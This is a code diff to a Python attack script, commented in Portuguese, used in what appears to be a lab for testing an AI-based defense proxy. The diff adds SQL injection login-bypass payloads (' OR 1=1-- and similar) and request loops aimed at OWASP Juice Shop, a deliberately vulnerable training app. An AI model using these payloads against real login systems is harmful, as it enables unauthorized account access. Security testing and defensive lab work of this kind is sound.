@@ -242,24 +242,33 @@ def attack_privesc(target: str) -> AttackReport:
 # ============================================================================
 
 # Endpoints nativos do OWASP Juice Shop (estáveis, documentados pela OWASP).
-# Mesma classe de ataque do attack_sqli, só que contra o app OWASP real —
-# o request passa pelo proxy (:9000), que loga em access_logs e aplica o 403.
+# O request passa pelo proxy (:9000), que loga em access_logs e aplica o 403.
 JUICESHOP_LOGIN = "/rest/user/login"
 JUICESHOP_SEARCH = "/rest/products/search"
 
+# Payloads de login específicos do Juice Shop. Diferente do server.py (Postgres,
+# tabela própria), o Juice Shop usa SQLite com schema próprio, então os bypass
+# que funcionam são outros. Estes são os auth-bypass clássicos documentados pela
+# OWASP (campo 'email'): fecham a string e comentam o resto da query, logando
+# como o 1º usuário da tabela (o admin). Sucesso = devolve token de autenticação.
+JUICESHOP_LOGIN_PAYLOADS = [
+    {"email": "' OR true--", "password": "x"},
+    {"email": "' OR 1=1--", "password": "x"},
+    {"email": "admin@juice-sh.op'--", "password": "x"},
+]
+
 
 def attack_juiceshop(target: str) -> AttackReport:
-    """SQLi contra o Juice Shop. Reusa os payloads do attack_sqli; muda só o
-    caminho e os nomes de campo (o Juice Shop fala email/data em vez de
-    username/rows). Aponte --target para o proxy, ex.: http://localhost:9000.
+    """SQLi contra o OWASP Juice Shop, pelos endpoints nativos. Aponte --target
+    para o proxy, ex.: http://localhost:9000 (ou http://proxy:9000 dentro do
+    Docker), pra entrar no ciclo de defesa (access_logs + 403).
     """
     report = AttackReport(mode="juice-shop")
     started = time.perf_counter()
 
     # 1) SQLi no login — auth-bypass pelo campo 'email'.
-    #    Sucesso = Juice Shop devolveu token de autenticação.
-    for payload in SQLI_LOGIN_PAYLOADS:
-        body = {"email": payload["username"], "password": payload["password"]}
+    #    Sucesso = Juice Shop devolveu token de autenticação (invasão real).
+    for body in JUICESHOP_LOGIN_PAYLOADS:
         resp = _post(target, JUICESHOP_LOGIN, body)
         _tally(
             report, resp,
@@ -267,7 +276,9 @@ def attack_juiceshop(target: str) -> AttackReport:
         )
 
     # 2) SQLi na busca de produtos — injeção via querystring 'q'.
-    #    Sucesso = retornou linhas na chave 'data'.
+    #    Reusa os payloads de SQLi do server.py como tráfego de ataque: mesmo
+    #    quando não extraem dados do schema do Juice Shop, são detectados e
+    #    bloqueados pela IA (que é o ponto do ciclo de defesa).
     for payload in SQLI_SEARCH_PAYLOADS:
         resp = _get(target, JUICESHOP_SEARCH, {"q": payload})
         _tally(report, resp, lambda b: len(b.get("data", [])) > 0)
